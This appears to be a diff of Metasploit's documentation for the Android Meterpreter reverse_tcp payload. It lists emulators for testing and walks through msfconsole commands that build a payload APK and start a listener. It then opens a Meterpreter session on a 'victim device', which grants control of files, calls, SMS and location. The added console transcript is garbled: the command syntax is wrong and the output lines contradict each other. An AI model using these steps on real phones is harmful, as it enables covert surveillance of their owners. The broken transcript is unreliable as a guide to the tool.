@@ -4,42 +4,6 @@ do with it already.
 
 The Android Meterpreter allows you to do things like take remote control the file system, listen to phone calls, retrieve or send SMS messages, geo-locate the user, run post-exploitation modules, etc.
 
-## Vulnerable Application
-
-You can test android/meterpreter/reverse_tcp on these devices:
-
-**Android Emulator**
-
-An emulator is the most convenient way to test Android Meterpreter. You can try:
-
-* [Android SDK](http://developer.android.com/sdk/index.html#Other) - Creates and manages your emulators from a command prompt or terminal.
-* [Android Studio](http://developer.android.com/sdk/installing/index.html?pkg=studio) - Allows you to manage emulators more easily than the SDK.
-* [GenyMotion](https://www.genymotion.com/download/) - Requires an account. 
-* [AndroidAVDRepo](https://github.com/dral3x/AndroidAVDRepo) - Contains a collection of pre-configured emulators.
-
-
-**A real Android device**
-
-Having a real Android device allows you to test features or vulnerabilities you don't necessarily
-have from an emulator, which might be specific to a manufacturer, carrier, or hardware. You also
-get to test it over a real network.
-
-
-## Verification Steps
-
-Currently, the most common way to use Android Meterpreter is to create it as an APK, and then
-execute it.
-
-To create the APK with msfconsole:
-
-```
-msf > use payload/android/meterpreter/reverse_tcp 
-msf payload(reverse_tcp) > set LHOST 192.168.1.199
-LHOST => 192.168.1.199
-msf payload(reverse_tcp) > generate -t raw -f /tmp/android.apk
-[*] Writing 8992 bytes to /tmp/android.apk...
-msf payload(reverse_tcp) >
-```
 
 ### To create the APK with msfvenom:
 
@@ -60,8 +24,59 @@ screenshots of the Android app that you are backdooring:
 [Please see here for more documentation on Android injection](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/android/meterpreter/injection.md).
 
 
-Next, start an Android device. Upload the APK, and execute it. There are different ways to do this,
-so please refer to the Scenarios section for more information.
+Next, start an Android device. Upload the APK, and execute it. There are different ways to do this.
+
+
+## Vulnerable Application
+
+You can test android/meterpreter/reverse_tcp on these devices:
+
+**Android Emulator**
+
+An emulator is the most convenient way to test Android Meterpreter. You can try:
+
+* [Bluestacks](https://www.bluestacks.com/)  - Very easy to install Android Emulator on Windows.
+* [Android SDK](http://developer.android.com/sdk/index.html#Other) - Creates and manages your emulators from a command prompt or terminal.
+* [Android Studio](http://developer.android.com/sdk/installing/index.html?pkg=studio) - Allows you to manage emulators more easily than the SDK.
+* [GenyMotion](https://www.genymotion.com/download/) - Requires an account. 
+* [AndroidAVDRepo](https://github.com/dral3x/AndroidAVDRepo) - Contains a collection of pre-configured emulators.
+
+
+**A real Android device**
+
+Having a real Android device allows you to test features or vulnerabilities you don't necessarily
+have from an emulator, which might be specific to a manufacturer, carrier, or hardware. You also
+get to test it over a real network.
+
+
+## Verification Steps
+
+Currently, the most common way to use Android Meterpreter is to create it as an APK, and then
+execute it in victim device.
+
+To start listner run msfconsole in terminal and then set listner settings:
+
+```
+msf > use exploit/multi/handler
+msf > set payload/android/meterpreter/reverse_tcp 
+msf payload(reverse_tcp) > set LHOST 192.168.1.199
+LHOST => 192.168.1.199
+msf payload(reverse_tcp) > run -j
+[*] Writing 8992 bytes to /tmp/android.apk...
+msf payload(reverse_tcp) > sessions    (To check which session is running type: 'sessions', in my case it is 1)
+  ID  Name  Type                           Information   Connection
+  __  ____  ___                            ___________   __________
+  1       android/meterpreter/reverse_tcp  u0_localhost  192.168.1.199:4444=> 192.168.0.110:35713
+  
+  
+msf payload(reverse_tcp) > sessions -i 1   (To set the session to proceed the attack)
+[*] Started reverse TCP handler on 192.168.1.199:4444 
+[*] Starting the payload handler...
+[*] Sending stage (62432 bytes) to 192.168.1.199
+[*] Meterpreter session 1 opened (192.168.1.199:4444 -> 192.168.1.199:49178) at 2016-03-08 13:00:10 -0600
+
+meterpreter > 
+```
 
 ## Important Basic Commands
 
